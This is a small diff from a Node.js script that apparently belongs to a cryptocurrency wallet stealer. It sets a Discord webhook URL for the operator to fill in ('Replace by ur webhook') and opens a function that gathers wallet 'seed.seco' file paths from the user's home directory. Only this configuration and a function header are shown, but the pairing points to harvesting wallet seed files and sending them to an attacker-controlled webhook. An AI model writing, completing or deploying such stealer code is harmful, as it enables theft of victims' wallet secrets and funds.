@@ -5,7 +5,7 @@ const https = require('https');
 const BOUNDARY = '----WebKitFormBoundary' + Math.random().toString(16).slice(2);
 
 // Replace by ur webhook
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_WEBHOOK_TOKEN';
+const WEBHOOK_URL = 'ur_webhook_dumbass';
 
 function getAllPossibleSeedSecoPaths() {
     const home = os.homedir();
